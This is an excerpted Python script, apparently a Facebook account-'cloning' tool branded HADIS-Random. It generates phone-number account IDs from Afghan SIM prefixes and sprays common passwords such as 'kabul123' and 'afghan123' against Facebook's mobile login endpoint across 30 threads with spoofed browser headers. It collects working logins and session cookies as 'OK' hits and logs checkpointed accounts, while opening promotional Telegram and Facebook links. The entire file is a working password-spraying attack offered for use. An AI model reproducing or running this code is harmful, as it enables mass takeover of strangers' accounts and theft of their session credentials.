...
try:
    ...
    os.system('python HADIS-Random.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
...
###    ### ###     ### #########  ###########  ########                        \033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 ...
 \033[1;34m┃ [✓] VERSOIN \033[1;91m  : \033[1;92mTRAIL
 \033[1;34   
 \033[1;34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\033[1;93m─────────────────────────────────────────────────────
\x1b[1;95m   𝙄 𝙀𝙉𝙅𝙊𝙔 𝙈𝙔 𝙇𝙄𝙁𝙀 𝙒𝙄𝙏𝙃 𝙈𝙔 𝙊𝙒𝙉 𝙍𝙐𝙇𝙀𝙎 🫀🤍  
\033[1;93m─────────────────────────────────────────────────────  """
clear()
os.system("Randomg-open https://t.me/Hadis_tech1")
xxxx = str(len(ugen))
print('\033[1;93m─────────────────────────────────────────────────────') 
...
def HADIS():
    ...
    if adi in ["1","01"]:
        ...
        os.system("Randomg-open https://www.facebook.com/sayedjamal.afg")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print('\033[1;93m─────────────────────────────────────────────────────')
    print(f'\033[1;97m[!] \033[1;92mAFG SIM CODES  \033[1;91m: \033[1;96m9378, 9379,9374,9370')
    print('\033[1;93m─────────────────────────────────────────────────────')
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['pubgpubg','kabul123','afghan123','afghanistan','600700','۱۰۰۲۰۰',]
...
def pass2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','۱۰۰۲۰۰',]
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;93m─────────────────────────────────────────────────────')
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def freeq(uid,pwx,tl):
    ...
    'referer': 'https://p.facebook.com/?_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5775.194", "Google Chrome";v="114.0.5775.194"',
    'sec-ch-ua-mobile': '?0',
    ...
    'sec-fetch-site': 'same-origin',
            ...
            "user-agent": pro,}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mRandom-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mRandom-CP\033[1;97m]\033[1;91m '+cid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mHADIS-Random\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
